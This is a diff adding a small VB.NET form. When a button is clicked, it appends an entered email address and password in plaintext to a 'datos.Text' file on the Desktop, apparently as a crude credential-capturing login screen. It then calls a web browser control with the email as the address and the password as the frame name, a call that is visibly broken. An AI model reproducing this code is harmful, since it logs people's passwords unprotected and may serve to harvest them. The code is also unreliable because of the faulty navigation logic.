@@ -1,0 +1,14 @@
+Public Class Form1
+
+    Private Sub INICIAR_Click(sender As Object, e As EventArgs) Handles INICIAR.Click
+        Dim ruta = My.Computer.FileSystem.SpecialDirectories.Desktop & "\datos.Text"
+
+        My.Computer.FileSystem.WriteAllText(ruta, vbCrLf & "correo electronico: " & Dato1.Text & "contraseña:" & Dato2.Text & vbCrLf, True)
+
+        WebBrowser1.Navigate(Dato1.Text, Dato2.Text)
+    End Sub
+
+    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
+
+    End Sub
+End Class
